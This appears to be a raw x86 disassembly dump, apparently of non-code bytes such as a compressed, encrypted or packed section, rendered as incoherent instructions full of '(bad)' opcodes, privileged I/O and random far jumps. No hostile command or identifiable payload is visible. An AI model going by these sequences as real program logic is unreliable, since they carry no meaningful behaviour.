  415a68:	sub    edi,DWORD PTR [eax+0x8]
  415a6b:	(bad)  
  415a6c:	jecxz  0x415a3e
  415a6e:	aam    0xad
  415a70:	push   ecx
  415a71:	sub    BYTE PTR [ebx],dh
  415a73:	mov    ebp,0x95e50b9e
  415a78:	fimul  WORD PTR [edx+edi*4-0x56c22998]
  415a7f:	mov    ds:0x28dcb8c7,eax
  415a84:	test   ebp,esp
  415a86:	xchg   edi,eax
  415a87:	in     eax,dx
  415a88:	jmp    0xd815:0x3c943510
  415a8f:	clc    
  415a90:	mov    edi,0xebfb5415
  415a95:	fwait
  415a96:	sbb    BYTE PTR [edi-0x72],dl
  415a99:	sbb    al,0x4c
  415a9b:	inc    ecx
  415a9c:	inc    ecx
  415a9d:	cmp    esp,DWORD PTR [edx+0x7a57bfec]
  415aa3:	sub    BYTE PTR [esi+0x8],0x68
  415aa7:	(bad)  
  415aa8:	jmp    FWORD PTR [esi]
  415aaa:	fisttp WORD PTR [ebx-0x6e2e0e3e]
  415ab0:	pop    ebx
  415ab1:	leave  
  415ab2:	(bad)  
  415ab4:	add    al,0xad
  415ab6:	ds nop
  415ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab9:	sbb    DWORD PTR [esi+0x39e77c24],ebp
  415abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac0:	jp     0x415b1a
  415ac2:	jno    0x415a63
  415ac4:	dec    edx
  415ac5:	adc    BYTE PTR [ecx],al
  415ac7:	jmp    0x3f8a:0x3c43a1e2
  415ace:	adc    eax,0x61d41923
  415ad3:	mov    edx,0x810be9e4
  415ad8:	sbb    ah,BYTE PTR [eax-0x26]
  415adb:	popf   
  415adc:	aad    0x37
  415ade:	call   0x9f5f1e1d
  415ae3:	aam    0x32
  415ae5:	cld    
  415ae6:	and    eax,0x11d1aba4
  415aeb:	test   eax,0x63ec34d2
  415af0:	mov    ecx,0xac8c39ba
  415af5:	imul   ebx,DWORD PTR [ebx],0xfa3edf88
  415afb:	mov    ah,0xea
  415afd:	ror    BYTE PTR [edx+eax*1],1
  415b00:	xor    dl,BYTE PTR [eax+0x5e]
  415b03:	in     al,dx
  415b04:	fisubr WORD PTR [edx+0x5a]
  415b07:	cmp    BYTE PTR [eax-0x6524e7ba],0xa0
  415b0e:	pop    ebx
  415b0f:	cld    
  415b10:	sub    eax,0xff0c89d6
  415b15:	loope  0x415b8e
  415b17:	je     0x415b58
  415b19:	sbb    bh,dl
  415b1b:	sub    ah,dh
  415b1d:	or     DWORD PTR [eax+0xe],edi
  415b20:	shr    edx,0x4c
  415b23:	mov    bl,0x64
  415b25:	xor    ecx,DWORD PTR ds:0x37e2ebc4
  415b2b:	cs imul edx,ebx,0xffffffa4
  415b2f:	call   0xbe4fa650
  415b34:	call   0x58d94355
  415b39:	dec    edx
  415b3a:	stos   BYTE PTR es:[edi],al
  415b3b:	inc    esi
  415b3c:	inc    DWORD PTR [esi+0x281aeda5]
  415b42:	cmp    DWORD PTR [edi],esp
  415b44:	mov    ebp,0x59022155
  415b49:	fdivr  st(3),st
  415b4b:	xor    ecx,DWORD PTR ds:0x910b6563
  415b51:	push   0x2f867f95
  415b56:	mov    DWORD PTR [ebx],eax
  415b58:	jno    0x415aee
  415b5a:	xchg   ebx,eax
  415b5c:	xor    al,0xbd
  415b5e:	adc    BYTE PTR [eax+0x41],ch
  415b61:	xor    DWORD PTR [edi-0x7869b7],edx
  415b67:	xor    dl,BYTE PTR [ebx-0x20104e70]
  415b6d:	mov    al,ds:0x6f5139bd
  415b72:	stos   BYTE PTR es:[edi],al
  415b73:	out    0x1b,eax
  415b75:	sti    
  415b76:	mov    esi,0xe3263da3
  415b7b:	repnz (bad) 
  415b7d:	cvttps2pi mm5,QWORD PTR [ebx*2-0x51ed428]
  415b85:	ins    DWORD PTR es:[edi],dx
  415b86:	mov    edi,0xb6a2d6ff
  415b8b:	int    0x8e
  415b8d:	mov    al,ds:0x723eed54
  415b92:	push   ss
  415b93:	ins    BYTE PTR es:[edi],dx
  415b94:	push   ds
  415b95:	dec    ebx
  415b96:	outs   dx,BYTE PTR ds:[esi]
  415b97:	add    dl,0x94
  415b9a:	dec    ebp
  415b9b:	call   0x4a45:0xc7f8ca03
  415ba2:	ins    DWORD PTR es:[edi],dx
  415ba3:	add    eax,0x689816ee
  415ba8:	xchg   edx,eax
  415ba9:	sub    esi,ebp
  415bab:	in     al,dx
  415bac:	pop    es
  415bad:	mov    ah,0x8f
  415baf:	inc    eax
  415bb0:	mov    bl,0x29
  415bb2:	loope  0x415bd7
  415bb4:	imul   eax,DWORD PTR ds:0xb445548f,0x44897807
  415bbe:	shl    BYTE PTR [edx+0x8],cl
  415bc1:	sbb    al,BYTE PTR [edi]
  415bc3:	or     eax,0x73168c15
  415bc8:	mov    cl,0xb6
  415bca:	and    eax,0xaf89be3d
  415bcf:	mov    ah,0xf0
  415bd1:	int    0x4d
  415bd3:	xchg   bh,dl
  415bd5:	push   esp
  415bd6:	mov    dl,0x6b
  415bd8:	inc    eax
  415bd9:	jae    0x415ba1
  415bdb:	pop    ebp
  415bdc:	adc    eax,0x11242a80
  415be1:	mov    esp,0xf7a141f8
  415be6:	shl    BYTE PTR [edx+eax*8-0x3ee9cffa],1
  415bed:	mov    dh,0x4e
  415bef:	jnp    0x415c4f
  415bf1:	test   DWORD PTR [edi+0x110bc353],edi
  415bf7:	push   esi
  415bf8:	out    0x46,eax
  415bfa:	inc    eax
  415bfb:	add    BYTE PTR [edx-0x3c893cf8],dl
  415c01:	imul   eax,DWORD PTR [eax],0xbddfaacb
  415c07:	xchg   edx,eax
  415c08:	mov    eax,DWORD PTR [ebx+0x509cfe94]
  415c0e:	pop    edi
  415c0f:	sub    al,0x36
  415c11:	and    eax,0x19fe9566
  415c16:	inc    edx
  415c17:	cmovbe ebp,DWORD PTR [ecx-0x3e]
  415c1b:	iret   
  415c1c:	mov    dl,0x13
  415c1e:	(bad)  [ebx+0x7ad1a9cb]
  415c24:	push   ecx
  415c25:	adc    BYTE PTR [esi+0x2],al
  415c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c29:	cmp    eax,0xf1c1d07b
  415c2e:	iret   
  415c2f:	enter  0x4dd,0xc5
  415c33:	push   es
  415c34:	mov    cl,0x96
  415c36:	jb     0x415cb5
  415c38:	inc    DWORD PTR [eax-0x3f]
  415c3b:	and    al,0x39
  415c3d:	stos   BYTE PTR es:[edi],al
  415c3e:	pop    edx
  415c3f:	add    eax,0x6410214b
  415c44:	xor    bh,BYTE PTR [edi-0x44]
  415c47:	retf   0x799b
  415c4a:	fcomp  QWORD PTR ds:0xfdb38522
  415c50:	or     ebp,DWORD PTR [ecx+0x54f3223f]
  415c56:	aam    0xe5
  415c58:	cwde   
  415c59:	add    esi,eax
  415c5b:	dec    ecx
  415c5c:	cmp    DWORD PTR [edx+0x39],edx
  415c5f:	and    eax,0xb86bf92f
  415c64:	sub    eax,0xb84a9b6c
  415c69:	or     eax,0x34da7b44
  415c6e:	lds    edx,FWORD PTR [ebx+eax*2+0x780ced9f]
  415c75:	clc    
  415c76:	pop    edx
  415c77:	mov    BYTE PTR [ecx-0x6eb02014],cl
  415c7d:	inc    ebp
  415c7e:	inc    ebp
  415c7f:	lods   al,BYTE PTR ds:[esi]
  415c80:	xchg   ebp,eax
  415c81:	sahf   
  415c82:	add    DWORD PTR es:[eax+0x32],eax
  415c86:	into   
  415c87:	add    eax,0xb3f659db
  415c8c:	mov    ecx,0xe5065d96
  415c91:	rol    BYTE PTR [ebx],1
  415c93:	retf   
  415c94:	int    0xa7
  415c96:	add    ebp,DWORD PTR [edi]
  415c98:	xchg   BYTE PTR [eax-0x16],bh
  415c9b:	test   DWORD PTR [edi+edx*8],ebx
  415c9e:	cmp    eax,0x6efb6c03
  415ca3:	xlat   BYTE PTR ds:[ebx]
  415ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca5:	inc    ebx
  415ca6:	mov    esi,0x2d638474
  415cab:	adc    eax,0xf0930640
  415cb0:	retf   0xc644
  415cb3:	(bad)  
  415cb5:	pop    eax
  415cb6:	je     0x415d0a
  415cb8:	xor    BYTE PTR [esp+esi*1],ah
  415cbb:	pop    ss
  415cbc:	pop    esp
  415cbd:	inc    ebp
  415cbe:	push   0xbaa1d42f
  415cc3:	or     ebp,eax
  415cc5:	inc    ebx
  415cc6:	pop    esi
  415cc7:	jmp    0x9973:0x9154b396
  415cce:	and    BYTE PTR [edx+eiz*4-0x7b],0xd
  415cd3:	mov    al,ds:0x377d3149
  415cd8:	arpl   WORD PTR [eax],dx
  415cda:	sbb    dl,ch
  415cdc:	add    DWORD PTR [edx-0x6626413d],esp
  415ce2:	sub    eax,0x104804cc
  415ce7:	and    al,0xa1
  415ce9:	out    0xe,eax
  415ceb:	into   
  415cec:	inc    edx
  415ced:	dec    esi
  415cee:	and    cl,BYTE PTR [eax+0x439ec8d8]
  415cf4:	mov    al,ds:0xfb446bdc
  415cf9:	cmp    DWORD PTR [eax],eax
  415cfb:	clc    
  415cfc:	popa   
  415cfd:	stos   DWORD PTR es:[edi],eax
  415cfe:	and    al,0xe7
  415d00:	pop    eax
  415d01:	cld    
  415d02:	es mov eax,ebx
  415d05:	icebp  
  415d06:	ja     0x415d2f
  415d08:	arpl   bx,cx
  415d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d0b:	les    eax,FWORD PTR [edx]
  415d0d:	mov    ecx,0x5a3522a3
  415d12:	add    eax,0xd9b5aadc
  415d17:	imul   edx,DWORD PTR [ebp+0x61],0xba8855f0
  415d1e:	mov    eax,0x52512be5
  415d24:	outs   dx,DWORD PTR ds:[esi]
  415d25:	or     al,0x1b
  415d27:	stc    
  415d28:	dec    ebx
  415d29:	mov    ebp,?
  415d2b:	cmp    eax,0xd97f02fd
  415d30:	pop    eax
  415d31:	push   0x1189b063
  415d36:	xchg   ebx,eax
  415d37:	xor    al,0x99
  415d39:	test   BYTE PTR [esi+0x148affb6],dh
  415d3f:	mov    ah,0xa
  415d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d42:	stc    
  415d43:	sub    BYTE PTR [eax],dl
  415d45:	sbb    edx,edx
  415d47:	sub    BYTE PTR [edx-0x8],dl
  415d4a:	pop    edi
  415d4b:	ja     0x415dc1
  415d4d:	ror    BYTE PTR [eax-0x72],0x26
  415d51:	inc    eax
  415d52:	out    0x92,eax
  415d54:	and    BYTE PTR [ecx],bh
  415d56:	test   al,0xee
  415d58:	adc    ecx,DWORD PTR [esi-0x53d120ad]
  415d5e:	dec    ebx
  415d5f:	cmp    ah,BYTE PTR [edi-0x76cab346]
  415d65:	jne    0x415d58
  415d67:	push   ecx
  415d68:	push   esi
  415d69:	xor    al,0x4b
  415d6b:	bound  ebp,QWORD PTR [ebx+0x3e4f7a75]
  415d71:	jae    0x415d18
  415d73:	mov    ebx,0xab961091
  415d78:	in     al,0x12
  415d7a:	and    DWORD PTR [esi+0x1b24c5d8],0xeca0f88b
  415d84:	iret   
  415d85:	jbe    0x415d5f
  415d87:	jle    0x415d66
  415d89:	pop    esi
  415d8a:	mov    ch,0xe1
  415d8c:	jg     0x415e02
  415d8e:	push   es
  415d8f:	int    0xbb
  415d91:	mov    fs,WORD PTR [ebx]
  415d93:	inc    esi
  415d94:	ror    DWORD PTR [esi+0x8eac5a1],1
  415d9a:	cmc    
  415d9b:	mov    edx,0xda42a800
  415da0:	mov    esp,0x95b065c8
  415da5:	ds pop esi
  415da7:	push   ebp
  415da8:	xor    al,bh
  415daa:	xor    edi,eax
  415dac:	mov    DWORD PTR [ebp+0x10],ecx
  415daf:	jmp    0x416339
  415db4:	inc    eax
  415db5:	mov    cl,BYTE PTR [ebx+edi*1+0x3c]
  415db9:	inc    ecx
  415dba:	inc    eax
  415dbb:	nop
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	shl    eax,0x74
  415dc0:	adc    ebx,DWORD PTR [ecx+0x3]
  415dc3:	test   al,0x26
  415dc5:	mov    bl,0xc
  415dc7:	push   ss
  415dc8:	cmp    eax,0x49161604
  415dcd:	push   eax
  415dce:	sbb    BYTE PTR ds:0x56dc9735,dl
  415dd4:	mov    esi,0x494c27ad
  415dd9:	add    BYTE PTR [edx-0x58fb48d1],al
  415ddf:	(bad)  
  415de0:	push   eax
  415de1:	sbb    DWORD PTR [ebp-0x7fd7fc9],ecx
  415de7:	dec    ebp
  415de8:	test   DWORD PTR [eax+ebx*8+0x1e],esp
  415dec:	push   eax
  415ded:	sbb    ah,0x85
  415df0:	es mov edx,0x9078b151
  415df6:	mov    ebp,0x7e565a38
  415dfb:	and    edx,DWORD PTR [ebp-0x2]
  415dfe:	jmp    0x91d9562a
  415e03:	or     DWORD PTR [ebx],esp
  415e05:	imul   DWORD PTR [ebp+0x79de243e]
  415e0b:	mov    bl,0x71
  415e0d:	jmp    0x415e6e
  415e0f:	jle    0x415db4
  415e11:	aas    
  415e12:	les    edx,FWORD PTR [eax-0x63f9123]
  415e18:	pop    ecx
  415e19:	retf   0xc84d
  415e1c:	cmp    al,0xfc
  415e1e:	fs loop 0x415daa
  415e21:	sahf   
  415e22:	pop    ebx
  415e23:	xchg   ah,dh
  415e25:	pop    ds
  415e26:	xor    DWORD PTR [ecx-0x5e],0xffffff98
  415e2a:	mov    ch,al
  415e2c:	outs   dx,BYTE PTR ds:[esi]
  415e2d:	cli    
  415e2e:	and    edi,DWORD PTR [esi+0x596a3980]
  415e34:	iret   
  415e35:	das    
  415e36:	xor    BYTE PTR ss:[edx+0x4e],dh
  415e3a:	xchg   ebx,eax
  415e3b:	sbb    BYTE PTR [ebp-0x7ef27d94],dh
  415e41:	dec    eax
  415e42:	int    0xc1
  415e44:	add    esp,DWORD PTR [ecx+0x41772041]
  415e4a:	xchg   edi,eax
  415e4b:	gs (bad) 
  415e4d:	loop   0x415e8e
  415e4f:	les    edx,FWORD PTR [ebp+ecx*8-0x4e5847df]
  415e56:	xchg   esi,eax
  415e57:	mov    al,BYTE PTR [edi-0x7b]
  415e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5b:	mov    esi,0xd1fb6721
  415e60:	shr    DWORD PTR [edi+ecx*2+0x235df28a],cl
  415e67:	sbb    eax,esp
  415e69:	xchg   cl,dl
  415e6b:	enter  0x9ad7,0x1c
  415e6f:	add    ah,BYTE PTR [ebp-0x719dd9bd]
  415e75:	stos   DWORD PTR es:[edi],eax
  415e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e77:	ret    
  415e78:	daa    
  415e79:	inc    esp
  415e7a:	mov    cs,WORD PTR [edi+0x5891e3dc]
  415e80:	adc    eax,0x47a68eb8
  415e85:	in     eax,dx
  415e86:	mov    ds:0xe8e0a908,eax
  415e8b:	cwde   
  415e8c:	aaa    
  415e8d:	out    0x10,eax
  415e8f:	into   
  415e90:	cmp    BYTE PTR [edi-0x6b],ah
  415e93:	push   ds
  415e94:	inc    edx
  415e95:	fcmovne st,st(3)
  415e97:	pushf  
  415e98:	push   ebx
  415e99:	sti    
  415e9a:	daa    
  415e9b:	ja     0x415edc
  415e9d:	pop    ecx
  415e9e:	dec    esp
  415e9f:	jmp    0x415e3a
  415ea1:	adc    esp,DWORD PTR [ebx]
  415ea3:	cmovbe edi,DWORD PTR [ecx+0x5a004263]
  415eaa:	cmp    al,0xfa
  415eac:	test   al,0x3
  415eae:	mov    dl,0x4b
  415eb0:	shl    BYTE PTR [ecx+0x461d466e],cl
  415eb6:	cdq    
  415eb7:	push   ds
  415eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb9:	cmp    DWORD PTR [eax+0x1b],0xccb49a39
  415ec0:	mov    bh,0xb7
  415ec2:	jle    0x415eba
  415ec4:	scas   al,BYTE PTR es:[edi]
  415ec5:	mov    esp,0x5ccfa915
  415eca:	mov    eax,ds:0xc3abf7
  415ecf:	mov    eax,0x866697f6
  415ed4:	(bad)  
  415ed5:	push   ebp
  415ed6:	sar    ch,cl
  415ed8:	popa   
  415ed9:	mov    eax,ds:0x1e27c30e
  415ede:	daa    
  415edf:	int3   
  415ee0:	in     eax,dx
  415ee1:	addr16 jmp 0xc3601cf9
  415ee7:	and    eax,0x4cd4b0de
  415eec:	jg     0x415f4a
  415eee:	jbe    0x415f61
  415ef0:	push   ebx
  415ef1:	sub    al,0x22
  415ef3:	out    0x17,eax
  415ef5:	pop    eax
  415ef6:	nop
  415ef7:	xor    BYTE PTR [ecx-0x36e8e295],dh
  415efd:	div    BYTE PTR [ebp+0x2b]
  415f00:	mov    BYTE PTR [esi-0x1c],ch
  415f03:	mov    WORD PTR [eax-0x5e],gs
  415f06:	dec    eax
  415f07:	shl    DWORD PTR [edi],1
  415f09:	test   BYTE PTR [eax-0x52],0x27
  415f0d:	add    DWORD PTR [edi+ecx*2+0x7f211c83],0x82f2a8de
  415f18:	(bad)  
  415f19:	mov    ah,0x66
  415f1b:	sahf   
  415f1c:	add    bh,BYTE PTR [esi+0x8]
  415f1f:	aas    
  415f20:	dec    edx
  415f21:	mov    ecx,0x1d1a07a1
  415f26:	sbb    al,0x5d
  415f28:	cmc    
  415f29:	add    al,BYTE PTR [ebx+0x4c45f7e9]
  415f2f:	xlat   BYTE PTR ds:[ebx]
  415f30:	add    al,0xbc
  415f32:	pop    ss
  415f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f34:	inc    ebx
  415f35:	js     0x415f51
  415f37:	push   cs
  415f38:	cmp    bl,0xf7
  415f3b:	into   
  415f3c:	push   edx
  415f3d:	call   0xaadf63af
  415f42:	push   edi
  415f43:	bound  ebx,QWORD PTR [eax+0x3a840c7b]
  415f49:	push   esp
  415f4a:	push   esp
  415f4b:	or     al,0x6b
  415f4d:	pop    ebx
  415f4e:	aad    0xf2
  415f50:	and    al,dh
  415f52:	es inc eax
  415f54:	mov    WORD PTR [ecx+0x448a24ab],?
  415f5a:	sub    edx,DWORD PTR [ebp-0x624a7481]
  415f60:	jg     0x415fd3
  415f62:	jmp    0x5da51bba
  415f67:	inc    edi
  415f68:	mov    ds,ecx
  415f6a:	cwde   
  415f6b:	or     DWORD PTR [ebx*8-0x401f3bfe],0x6c
  415f73:	mov    ebp,0x4c96b311
  415f78:	adc    al,0xe1
  415f7a:	adc    cl,BYTE PTR [esi]
  415f7c:	cld    
  415f7d:	push   edi
  415f7e:	push   esp
  415f7f:	cmp    al,0x36
  415f81:	adc    dl,BYTE PTR [ecx+eiz*1+0x60]
  415f85:	xor    al,0xf3
  415f87:	fs pop edi
  415f89:	push   esi
  415f8a:	ror    dh,0x30
  415f8d:	data16 mov bl,0xe6
  415f90:	jmp    0xd7069fd1
  415f95:	sub    BYTE PTR [eax+ebx*4-0x20],0x17
  415f9a:	ficomp WORD PTR [esi+ebx*4]
  415f9d:	cmp    bh,BYTE PTR [edx+0x7d]
  415fa0:	mov    esi,0x1d38fe12
  415fa5:	sbb    eax,0x6181266d
  415faa:	add    al,0xf3
  415fac:	dec    ebx
  415fad:	jp     0x415fee
  415faf:	xor    BYTE PTR [edx+0x629c1a5b],dl
  415fb5:	into   
  415fb6:	out    0xe8,al
  415fb8:	dec    edi
  415fb9:	scas   eax,DWORD PTR es:[edi]
  415fba:	cmc    
  415fbb:	mov    WORD PTR [ebx+0x67d2bfa9],?
  415fc1:	aas    
  415fc2:	pop    esp
  415fc3:	lahf   
  415fc4:	outs   dx,DWORD PTR ds:[esi]
  415fc5:	xchg   BYTE PTR [ecx-0x75],al
  415fc8:	je     0x415f90
  415fca:	inc    edi
  415fcb:	outs   dx,DWORD PTR ds:[esi]
  415fcc:	pop    ss
  415fcd:	imul   edx,DWORD PTR [eax-0x6f],0xffffffe2
  415fd1:	mov    ah,0xac
  415fd3:	pop    ds
  415fd4:	mov    ah,0x74
  415fd6:	jge    0x415f5a
  415fd8:	mov    edi,0x262c0125
  415fdd:	adc    esi,DWORD PTR [ebx+edx*1]
  415fe0:	or     DWORD PTR [esi-0x52d404a2],esi
  415fe6:	xor    BYTE PTR [eax+ecx*2],0x1a
  415fea:	mov    dl,0x9
  415fec:	push   edi
  415fed:	imul   eax,DWORD PTR [ecx-0x7],0xf71cf8ad
  415ff4:	push   ecx
  415ff5:	stc    
  415ff6:	or     eax,0x47db7e75
  415ffb:	int3   
  415ffc:	mov    ch,0x88
  415ffe:	scas   eax,DWORD PTR es:[edi]
  415fff:	pusha  
  416000:	or     edi,DWORD PTR [ebx-0x49042bf9]
  416006:	jecxz  0x41600e
  416008:	ror    DWORD PTR [eax],0x98
  41600b:	stos   DWORD PTR es:[edi],eax
  41600c:	push   ebx
  41600d:	jmp    0x415ff3
  41600f:	add    BYTE PTR [ebp-0x1df64c12],bh
  416015:	sbb    BYTE PTR [ecx-0x1b2568cd],bl
  41601b:	mov    esp,0xe506de29
  416020:	cmovp  esp,DWORD PTR [ebx]
  416023:	pop    edx
  416024:	mov    ah,0xaa
  416026:	inc    edi
  416027:	arpl   WORD PTR ss:[ebp+0x3a],ax
  41602b:	sub    BYTE PTR [ebx+0x3ec30407],dl
  416031:	(bad)  
  416032:	imul   eax,ebp,0x65
  416035:	stc    
  416036:	sbb    dl,BYTE PTR [ecx-0x31]
  416039:	jl     0x4160a5
  41603b:	inc    DWORD PTR [ecx]
  41603d:	(bad)  
  41603e:	push   ebp
  41603f:	(bad)  
  416041:	out    dx,eax
  416042:	mov    ch,BYTE PTR [edi-0x5dd1bdde]
  416048:	(bad)  
  416049:	jmp    0x416097
  41604b:	jo     0x416002
  41604d:	lock push 0xffffffa8
  416050:	loope  0x415ff2
  416052:	stos   BYTE PTR es:[edi],al
  416053:	div    DWORD PTR [edi+0x2b4c812c]
  416059:	add    dh,cl
  41605b:	rcl    BYTE PTR [edi],0x32
  41605e:	(bad)  
  41605f:	fadd   QWORD PTR [ebx]
  416061:	xor    al,0xcb
  416063:	stos   DWORD PTR es:[edi],eax
  416064:	adc    ah,BYTE PTR [ecx+0x38f66a1a]
  41606a:	cmp    edx,esi
  41606c:	adc    ecx,ebx
  41606e:	jmp    0x7d76:0xdaf10b3
  416075:	ins    BYTE PTR es:[edi],dx
  416076:	xchg   esp,eax
  416077:	push   esp
  416078:	retf   
  416079:	inc    esi
  41607a:	(bad)
  41607f:	xchg   edx,eax
  416080:	gs je  0x416043
  416083:	sub    al,0xa9
  416085:	popa   
  416086:	out    dx,eax
  416087:	pushf  
  416088:	stos   BYTE PTR es:[edi],al
  416089:	sbb    bh,bl
  41608b:	fwait
  41608c:	cmp    DWORD PTR [eax-0xe],esi
  41608f:	repz xor DWORD PTR [edi],0x56
  416093:	in     eax,dx
  416094:	mov    ah,0x97
  416096:	inc    ebp
  416097:	push   cs
  416098:	loope  0x4160c8
  41609a:	jno    0x41602a
  41609c:	jp     0x4160b0
  41609e:	xchg   edx,eax
  41609f:	imul   edi,DWORD PTR [ecx+0x6c],0xdb7906c8
  4160a6:	xor    edx,ebp
  4160a8:	inc    ecx
  4160a9:	mov    ah,0xa7
  4160ab:	pop    esi
  4160ac:	fucomi st,st(7)
  4160ae:	cmc    
  4160af:	jecxz  0x416062
  4160b1:	adc    al,0x31
  4160b3:	ds jb  0x41605f
  4160b6:	jle    0x41607d
  4160b8:	and    bl,bl
  4160ba:	mov    edx,DWORD PTR [eax]
  4160bc:	scas   eax,DWORD PTR es:[edi]
  4160bd:	push   es
  4160be:	dec    ecx
  4160bf:	add    al,0x48
  4160c1:	sub    eax,0x946ad133
  4160c6:	jge    0x416130
  4160c8:	sub    ebx,ebp
  4160ca:	jmp    0x4160c9
  4160cc:	dec    ebx
  4160cd:	pop    ds
  4160ce:	mov    dh,0xba
  4160d0:	pop    ecx
  4160d1:	jmp    0xe87a:0xbafdb658
  4160d8:	aad    0xfd
  4160da:	jbe    0x4160d8
  4160dc:	add    al,0xfd
  4160de:	or     bl,BYTE PTR [eax+0x5e]
  4160e1:	mov    ebp,0x31db394f
  4160e6:	add    DWORD PTR [ebx+0x52],eax
  4160e9:	mov    esp,0x5305e121
  4160ee:	ror    DWORD PTR [esi-0x7394aa5a],cl
  4160f4:	stc    
  4160f5:	push   ebx
  4160f6:	dec    esp
  4160f7:	xlat   BYTE PTR ds:[ebx]
  4160f8:	cwde   
  4160f9:	adc    BYTE PTR [eax-0x63],0x68
  4160fd:	xlat   BYTE PTR ds:[ebx]
  4160fe:	add    ebp,ebp
  416100:	mov    BYTE PTR [edi],ah
  416102:	mov    dh,dl
  416104:	sar    DWORD PTR [ebx+ebp*1-0x76cb304b],0x73
  41610c:	mov    al,0xfb
  41610e:	lods   eax,DWORD PTR ds:[esi]
  41610f:	pop    ds
  416110:	mov    BYTE PTR [edi+0x5038332],dl
  416116:	pushf  
  416117:	push   esi
  416118:	xor    ecx,DWORD PTR [eax-0x6e715975]
  41611e:	push   esp
  41611f:	mov    bh,0x91
  416121:	(bad)
  416126:	jg     0x4160f4
  416128:	mov    ch,0x68
  41612a:	jmp    0x416167
  41612c:	jg     0x4160de
  41612e:	pop    ecx
  41612f:	gs cmp al,0x5d
  416132:	cmp    cl,ch
  416134:	scas   eax,DWORD PTR es:[edi]
  416135:	sbb    eax,0xff903e14
  41613a:	push   ebp
  41613b:	test   al,0xe5
  41613d:	test   ecx,0x8218e7d4
  416143:	jge    0x4160c9
  416145:	xchg   DWORD PTR [edi-0x22d94da6],esi
  41614b:	js     0x41614f
  41614d:	out    0xe4,eax
  41614f:	sub    DWORD PTR [esi-0xa],eax
  416152:	jnp    0x41611b
  416154:	int    0xcf
  416156:	cmp    DWORD PTR [edi+0x6f],edx
  416159:	(bad)  [ebx]
  41615b:	adc    BYTE PTR [edi-0x6a],ah
  41615e:	sahf   
  41615f:	xor    al,0xac
  416161:	dec    edx
  416162:	sub    ecx,esi
  416164:	or     DWORD PTR [ebp-0x15],edi
  416167:	pop    edi
  416168:	ja     0x4161ce
  41616a:	mov    edx,0x112fe127
  41616f:	xchg   DWORD PTR [ecx-0x15cdfd3d],ecx
  416175:	add    ch,cl
  416177:	cld    
  416178:	in     al,dx
  416179:	loope  0x416127
  41617b:	dec    eax
  41617c:	push   edi
  41617d:	test   al,0x1d
  41617f:	jno    0x416130
  416181:	imul   edi,esi,0xdc32d75
  416187:	into   
  416188:	or     al,0x6c
  41618a:	inc    edx
  41618b:	adc    DWORD PTR [edi+0xe],0xfffffff2
  41618f:	out    0xaf,al
  416191:	push   es
  416192:	xor    DWORD PTR [ebx],eax
  416194:	jl     0x416118
  416196:	add    eax,0x6caad52f
  41619b:	retf   0xee3c
  41619e:	daa    
  41619f:	dec    ebx
  4161a0:	aad    0x73
  4161a2:	adc    eax,0xd3ce667a
  4161a7:	aas    
  4161a8:	or     DWORD PTR [esi],edi
  4161aa:	cs jl  0x4161db
  4161ad:	aas    
  4161ae:	mov    eax,ds:0x9d37c168
  4161b3:	or     al,0x28
  4161b5:	and    esi,DWORD PTR es:[edi+edi*1]
  4161b9:	adc    eax,0x67cd1eeb
  4161be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161bf:	rol    BYTE PTR [edx],cl
  4161c1:	fldcw  WORD PTR [esi-0x6d6585fc]
  4161c7:	ret    
  4161c8:	jne    0x4161f6
  4161ca:	jns    0x416195
  4161cc:	and    DWORD PTR [ebx+0x47],eax
  4161cf:	adc    BYTE PTR [edi],bh
  4161d1:	test   BYTE PTR [edi],al
  4161d3:	sbb    DWORD PTR [esi-0x16],ebx
  4161d6:	aaa    
  4161d7:	ret    0x7903
  4161da:	aas    
  4161db:	test   dl,dl
  4161dd:	and    bl,dh
  4161df:	in     eax,dx
  4161e0:	ret    0xff0f
  4161e3:	push   ebx
  4161e4:	mov    esi,0x881e934e
  4161e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ea:	push   ebp
  4161eb:	aad    0x1f
  4161ed:	stos   DWORD PTR es:[edi],eax
  4161ee:	mov    ds:0xeffca5e1,eax
  4161f3:	sbb    eax,DWORD PTR [edi]
  4161f5:	stos   DWORD PTR es:[edi],eax
  4161f6:	std    
  4161f7:	outs   dx,BYTE PTR ds:[esi]
  4161f8:	imul   eax,DWORD PTR [eax-0x70320c18],0x5e13eab9
  416202:	and    BYTE PTR [edx],al
  416204:	cwde   
  416205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416206:	xchg   esi,eax
  416207:	xchg   ebp,eax
  416208:	add    dl,cl
  41620a:	xchg   esi,eax
  41620b:	jnp    0x4161c3
  41620d:	fsubp  st(4),st
  41620f:	bswap  ebx
  416211:	sar    esi,cl
  416213:	dec    edi
  416214:	adc    BYTE PTR [eax],dl
  416216:	test   eax,0x8060c5a
  41621b:	stc    
  41621c:	push   edi
  41621d:	sub    al,0x14
  41621f:	les    edi,FWORD PTR [ecx]
  416221:	sub    eax,0x940d8e10
  416226:	ds jge 0x41623e
  416229:	loope  0x4161ca
  41622b:	jb     0x416208
  41622d:	cdq    
  41622e:	mov    ah,0xe
  416230:	cli    
  416231:	cli    
  416232:	inc    eax
  416233:	stos   DWORD PTR es:[edi],eax
  416234:	mov    al,ds:0x8964eec7
  416239:	xor    bh,BYTE PTR [esi]
  41623b:	xchg   ecx,eax
  41623c:	lds    ecx,FWORD PTR [esi]
  41623e:	pop    edi
  41623f:	inc    eax
  416240:	test   BYTE PTR [edi],bl
  416242:	mov    dl,0x96
  416244:	mov    al,0x3e
  416246:	cld    
  416247:	fisttp WORD PTR [esp+edi*4-0x6]
  41624b:	arpl   di,di
  41624d:	or     dl,BYTE PTR [esi+0x6b]
  416250:	push   ebx
  416251:	mov    eax,ds:0x5fc2f2a8
